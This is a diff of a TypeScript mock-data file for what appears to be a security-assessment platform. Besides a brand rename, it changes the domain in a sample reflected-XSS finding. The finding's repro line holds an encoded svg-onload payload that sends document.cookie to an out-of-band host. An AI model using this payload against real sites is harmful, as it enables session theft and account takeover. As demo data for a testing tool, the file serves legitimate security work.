@@ -1,4 +1,4 @@
-// Tensol — typed mock data ported 1:1 from tensol-platform-design/project/src/data.js
+// Sthrip — typed mock data ported 1:1 from tensol-platform-design/project/src/data.js
 
 export type TargetType = 'web' | 'api' | 'host' | 'cloud' | 'repository';
 export type AssessmentStatus = 'running' | 'awaiting_approval' | 'completed' | 'cancelled';
@@ -167,7 +167,7 @@ export const TENSOL_DATA: TensolData = {
       foundAt: '2026-05-04 11:14',
       impact: 'Attacker-controlled HTML executes in the victim session. CSP allows inline; cookie SameSite=Lax not enforced for subdomain. Account-takeover demonstrated via session cookie exfiltration to OOB sink.',
       repro: [
-        'GET https://app.acme-bank.ru/search?q=%3Csvg%2Fonload%3Dfetch(`https://oob.tensol.dev/c/8f2c?c=`%2Bdocument.cookie)%3E',
+        'GET https://app.acme-bank.ru/search?q=%3Csvg%2Fonload%3Dfetch(`https://oob.sthrip.dev/c/8f2c?c=`%2Bdocument.cookie)%3E',
         'Server reflects q into <h1> without escaping (response.body line 412).',
         'Browser executes payload. OOB callback received in 412ms with full session cookie.',
       ],
